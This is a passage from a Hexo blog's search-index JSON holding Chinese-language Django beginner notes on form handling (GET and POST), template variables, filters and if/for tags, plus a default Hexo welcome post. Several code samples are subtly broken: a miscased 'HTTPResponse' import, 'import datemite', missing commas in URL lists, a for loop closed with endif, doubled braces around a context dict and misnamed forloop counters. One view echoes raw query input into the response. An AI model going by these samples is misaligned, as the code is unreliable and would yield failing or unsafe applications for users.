redirect:底层继承的是HttpResponse对象","categories":[{"name":"Django","slug":"Django","permalink":"http://example.com/categories/Django/"}],"tags":[],"author":"Dokey_"},{"title":"Django学习笔记-03","slug":"Django学习笔记-03","date":"2021-02-19T09:06:44.000Z","updated":"2023-03-25T14:35:06.427Z","comments":true,"path":"8467.html","link":"","permalink":"http://example.com/8467.html","excerpt":"","text":"Django表单HTTP 请求HTTP协议以”请求 - 回复”的方式工作。客户发送请求时，可以在请求中附加数据。服务器通过解析请求，就可以获得客户传来的数据，并根据URL来提供特定的服务 GET 方法视图显示（search_form.html）和请求处理分成两个函数（search_form、search）处理 search.py 文件代码1234567891011121314from django.http import HTTPResponsefrom django.shortcuts import renderdef search_form(request): return render(request, &#x27;search_form.html&#x27;) def search(request): request.encoding = &#x27;utf-8&#x27; if &#x27;q&#x27; in request.GET and request.GET[&#x27;q&#x27;]: message = &quot;你搜索的内容为：&quot; + request.GET[&#x27;q&#x27;] else: message = &quot;你提交了空表单&quot; return HTTPResponse(message) templates&#x2F;search_form.html123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&#x27;utf-8&#x27;&gt;&lt;title&gt;Okay Dokey yo&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=&quot;/search/&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;q&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;搜索&quot;&gt;&lt;/body&gt;&lt;/html&gt; Tips：action属性规定当提交表单时，向何处发送表单数据。 urls.py 文件代码12345678910from django.conf.urls import urlfrom . import views,searchurlpatterns = [ url(r&#x27;^search_form/$&#x27;, search.search_form) url(r&#x27;^search/$&#x27;, search.search) #path(&#x27;search_form/&#x27;, search.search_form) #path(&#x27;search/&#x27;, search.search)] POST 方法并用一个URL和处理函数，同时显示视图和处理请求。 templates&#x2F;search_post.html123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;Dokey&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;/search_post/&quot; method=&quot;post&quot;&gt; &#123;% csrf_token %&#125; &lt;input type=&quot;text&quot; name=&quot;q&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;搜索&quot;&gt; &lt;/form&gt; &lt;p&gt;&#123;&#123;rlt&#125;&#125;&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 在模板的末尾，增加一个rlt记号，为表格处理结果预留位置。表格后面有一个{csrf_token}标签。这是Django提供的防止伪装提交请求的功能。POST方法提交的表格，必须有此标签。 search_post.py 文件代码12345678from django.shortcuts import renderfrom django.views.decorators import csrfdef search_post(request): ctx = &#123;&#125; if request.POST: ctx[&#x27;rlt&#x27;] = request.POST[&#x27;q&#x27;] return render(request, &#x27;search_post.html&#x27;, ctx) urls.py 文件代码1234567from django.conf.urls import urlfrom . import views,search_posturlpatterns = [ url(r&#x27;^search_post/$&#x27;, search_post.search_post) #path(&quot;search_post.html&quot;, search_post.search_post)] Tips：使用path()亦可，在search_post.html中form标签action属性中指定值为&#x2F;search_post&#x2F;时会报404错误，所以使用url()。","categories":[{"name":"Django","slug":"Django","permalink":"http://example.com/categories/Django/"}],"tags":[],"author":"Dokey_"},{"title":"Djange学习笔记-02","slug":"Django学习笔记-02","date":"2021-02-08T09:17:00.000Z","updated":"2023-03-25T14:35:06.424Z","comments":true,"path":"18004.html","link":"","permalink":"http://example.com/18004.html","excerpt":"","text":"Django模板标签变量模板语法12view: &#123;&quot;HTML变量名&quot; ：&quot;views变量名&quot;&#125;HTML: &#123;&#123;变量名&#125;&#125; views.py 文件代码12345from django.shortcuts import renderdef runoob(request): views_name = &quot;okay dokey yo!&quot; return render(request, &#x27;runoob.html&#x27;, &#123;&quot;name&quot;:views_name&#125;) templates中的runoob.html1&#123;&#123;name&#125;&#125; 列表templates中的runoob.html中，可以用.索引下标取出对应的元素 views.py 文件代码12345from django.shortcuts import renderdef runoob(request): views_list = [&quot;okay&quot;, &quot;dokey&quot;, &quot;yo&quot;] return render(request, &#x27;runoob.html&#x27;, &#123;&quot;views_list&quot;: views_list&#125;) templates中的runoob.html12&lt;p&gt;&#123;&#123;views_list&#125;&#125;&lt;/p&gt;&lt;p&gt;&#123;&#123;views_list.1&#125;&#125;&lt;/p&gt; 字典templates中的runoob.html中，可以用 .键 取出对应的值 views.py 文件代码123456from django.shortcuts import renderdef runoob(request): views_dict = &#123;&quot;name&quot; : &quot;okay dokey&quot;&#125; return render(request, &#x27;runoob.html&#x27;, &#123;&quot;views_dict&quot;:views_dict&#125;) templates中的runoob.html12&lt;p&gt;&#123;&#123;views_dict&#125;&#125;&lt;/p&gt;&lt;p&gt;&#123;&#123;views_dict.name&#125;&#125;&lt;/p&gt; 过滤器模板语法: 1&#123;&#123;变量名|过滤器:可选参数&#125;&#125; 模板过滤器可以在变量被现实前修改它,过滤器使用管道字符: 12&#123;&#123;name|lower&#125;&#125;#&#123;&#123;name&#125;&#125;变量被过滤器lower处理后,文档大写转换文本成小写 过滤管道可以被套接 ,一个过滤管道的输出又可以作为下一个管道的输入 12&#123;&#123;my_list|first|upper&#125;&#125;#将第一个元素转化为大写 过滤器的参数跟随冒号之后并且总是以双引号包含: 12&#123;&#123;bio|truncatewords:&quot;30&quot;&#125;&#125;#显示变量bio前30个词 其他过滤器: addslashes:添加反斜杠到任何反斜杠\\单引号或者双引号前面 date:按指定的格式字符串参数格式化date或者datetime对象: 1 &#123;&#123;pub_date|date:&quot;F j, Y&quot;&#125;&#125; length:返回变量的长度 defaultdefault为变量提供一个默认值如果views传的变量的布尔值是false,则使用指定的默认值以下值为false: 10 0.0 False 0j &quot;&quot; [] () set() &#123;&#125; None views.py 文件代码12345from django.shortcuts import renderdef runoob(request): views_name = 0 return render(request, &#x27;runoob.html&#x27;, &#123;&quot;views_name&quot;: views_name&#125;) templates中runobb.html1&#123;&#123;views_name|default:&quot;okay dokey&quot;&#125;&#125; length返回对象的长度,适用于字符串和列表字典返回的键值对的数量,集合返回的是去重后的长度 12345from django.shortcuts import renderdef runoob(request): views_name = &quot;okay dokey&quot; return render(request, &#x27;runoob.html&#x27;, &#123;&quot;views_name&quot;: views_name&#125;) templatest中runoob.html1&#123;&#123;views_name|length&#125;&#125; filesizeformat以更易读的方式显示文件的大小(即’13 KB’,’5 MB’,’10 bytes’等)字典返回的是键值对的数量,集合返回的是去重后的长度 views.py 文件代码12345from django.shortcuts import renderdef runoob(request): num = 1024 return render(request, &#x27;runoob.html&#x27;, &#123;&quot;num&quot;: num&#125;) templates中runoob.html1&#123;&#123;num|filesizeformat&#125;&#125; date根据给定格式对一个日期变量进行格式化格式Y-m-d H:i:s返回年-月-日 小时-分钟-秒的格式时间 views.py 文件代码123456from django.shortcuts import renderdef runoob(request): import datemite now = datetime.datetime.now() return render(request, &#x27;runoob.html&#x27;, &#123;&quot;now&quot;:now&#125;) templatest中runoob.html1&#123;&#123;now|date:&quot;Y-m-d&quot;&#125;&#125; truncatechars如果字符串包含的字符总个数多于指定的字符数量,那么会被截断掉后面的部分.截断的字符串将以 … 结尾 12345from django.shortcuts import renderdef runoob(request): views_name = &#x27;okay dokey&#x27; return render(request, &#x27;runoob.html&#x27;, &#123;&quot;views_name&quot;: views_name&#125;) templates中runoob.html1&#123;&#123;views_name|truncatechars:2&#125;&#125; safe将字符串标记为安全,不需要转义要保证views.py传过来的数据绝对安全,才能用safe和后端views.py的make_safe效果相同.Django会自动对views.py传到HTML文件中的标签语法进行转义,令其语义失效.加safe过滤器是告诉Django该数据是安全的,不必对其进行转义,可以让该数据语义生效. views.py 文件代码12345from django.shortcuts import renderdef runoob(request): views_str = &#x27;&lt;a herf=&quot;https://www.baidu.com&quot;&gt;点击跳转&lt;/a&gt;&#x27; return render(request, &#x27;runoob.html&#x27;, &#123;&#123;&quot;views_str&quot;: views_str&#125;&#125;) templates中runoob.html1&#123;&#123;views_str|safe&#125;&#125; if&#x2F;else标签基本语法格式如下: 123&#123;% if condition %&#125; ...display &#123;% endif %&#125; 或者: 1234567&#123;% if condition1 %&#125; ...display&#123;% elif condiion2 %&#125; ...display &#123;% else %&#125; ...display &#123;% endif %&#125; 根据条件判断是否输出.if&#x2F;else支持嵌套 12345&#123;% if %&#125;标签接受and, or或者not关键字来对多个变量做判断,或者对变量取反(not)&#123;% if athlete_list and coach_list %&#125; athletes 和 coaches 变量都是可用. &#123;% endif %&#125; views.py文件代码12345from django.shortcuts import renderdef runobb(request): num = 80 return render(request, &#x27;runobb.html&#x27;, &#123;&quot;num&quot;: num&#125;) templates中runoob.html1234567&#123;%if num&gt;90 and num&lt;=100 %&#125;优秀&#123;%elif num&gt;60 and num&lt;=90 %&#125;合格&#123;% else %&#125;GG&#123;% endif %&#125; for标签123&#123;% for %&#125;允许我们在一个序列上迭代与Python的for语句情形类似,循坏语法是for X in Y, Y是要迭代的序列而X是在每一个特定的循坏中使用的变量名称.每一次循环中,模板系统会渲染在&#123;% for %&#125;和&#123;% endfor %&#125;之间的所有内容. views.py 文件代码12345from django.shortcuts import renderdef runoob(request): views_list = [&#x27;okay&#x27;, &#x27;dokey&#x27;, &#x27;yo&#x27;] return render(request, &#x27;runoob.html&#x27;, &#123;&quot;views_list&quot;: views_list&#125;) templatest中runoob.html123&#123;% for i in views_list%&#125;&#123;&#123;i&#125;&#125;&#123;% endif %&#125; 给标签增加一个reversed使得该列表被反向迭代 123&#123;% for i in views_list %&#125;&#123;&#123; i &#125;&#125;&#123;&#123;% endfor %&#125;&#125; 遍历字典可以直接使用字典.items方法,用变量的解包分别获取键和值 views.py 文件代码12345from django.shortcuts import renderdef runoob(request): views_dict = &#123;&quot;name&quot;:&quot;dokey&quot;, &quot;age&quot;: 18&#125; return render(request, &#x27;runoob.html&#x27;, &#123;&quot;views_dict&quot;: views_dict&#125;) templates中runoob.html123&#123;% for i,j in views_dict.items %&#125;&#123;&#123; i &#125;&#125; ---- &#123;&#123; j &#125;&#125;&#123;% endfor %&#125; 在for标签里可以通过forloop变量获取循环序号 forloop.counter:顺序获取循环序号,从1开始计算 forloop.conter():顺序获取循环序号,从0开始计算 forloop.revcounter:倒序获取循环序号,结尾序号为1 forloop.revcounter():倒序获取循环序号,结尾序号为0 forloop.first:第一条数据返回True,其他数据返回False forloop.last:最后一条数据返回True,其他数据返回False","categories":[{"name":"Django","slug":"Django","permalink":"http://example.com/categories/Django/"}],"tags":[],"author":"Dokey_"},{"title":"Django学习笔记-01","slug":"Django学习笔记-01","date":"2021-02-08T03:30:00.000Z","updated":"2023-03-25T14:35:06.421Z","comments":true,"path":"57490.html","link":"","permalink":"http://example.com/57490.html","excerpt":"","text":"Django path()函数 Path()函数可以接收四个参数，分别是两个必选参数:router、view和两个可选参数:kwargs、name path(router, view, kwargs&#x3D;None, name&#x3D;None) router:字符串,表示URL规则,与之匹配的URL会执行对应的第二个参数view. view:用于执行与正则表达式匹配的URL请求. kwargs:视图使用的字典类型的参数. name:用来反向获取URL. Django 模板 引用模板文件,修改settings.py;修改TEMPLATES中的DIRS为[os.path.join(BASE_DIR,’templates’)]123456789101112131415 TEMPLATES = [ &#123; &#x27;BACKEND&#x27;: &#x27;django.template.backends.django.DjangoTemplates&#x27;, &#x27;DIRS&#x27;: [os.path.join(BASE_DIR, &#x27;templates&#x27;)], &#x27;APP_DIRS&#x27;: True, &#x27;OPTIONS&#x27;: &#123; &#x27;context_processors&#x27;: [ &#x27;django.template.context_processors.debug&#x27;, &#x27;django.template.context_processors.request&#x27;, &#x27;django.contrib.auth.context_processors.auth&#x27;, &#x27;django.contrib.messages.context_processors.messages&#x27;, ], &#125;, &#125;,] 修改views.py,增加一个新对象,用于向模板提交数据:12345from django.shortcuts import renderdef runoob(request): context = &#123;&#125; context[&#x27;hello&#x27;] = &quot;Hello World!&quot; return render(request, &#x27;runoob.html&#x27;, context) 修改urls.py代码123456from django.urls import pathfrom . import views urlpatterns = [ path(&#x27;runoob/&#x27;, views.runoob) ] 总结: 使用render来替代HttpRequest; render使用一个字典context作为参数, context字典中元素的键值hello对应了模板HTML文件中的变量hello.","categories":[{"name":"Django","slug":"Django","permalink":"http://example.com/categories/Django/"}],"tags":[],"author":"Dokey_"},{"title":"Hello World","slug":"hello-world","date":"2021-02-05T16:22:00.000Z","updated":"2023-03-25T14:35:06.445Z","comments":true,"path":"16107.html","link":"","permalink":"http://example.com/16107.html","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"},{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"},{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/categories/Windows-API/"},{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"计算机组成","slug":"计算机组成","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/"},{"name":"vue","slug":"vue","permalink":"http://example.com/categories/vue/"},{"name":"Django","slug":"Django","permalink":"http://example.com/categories/Django/"}],"tags":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"},{"name":"windows Hook","slug":"windows-Hook","permalink":"http://example.com/tags/windows-Hook/"},{"name":"windows Inject","slug":"windows-Inject","permalink":"http://example.com/tags/windows-Inject/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"},{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/tags/Windows-API/"},{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"bilibili大学","slug":"bilibili大学","permalink":"http://example.com/tags/bilibili%E5%A4%A7%E5%AD%A6/"}]}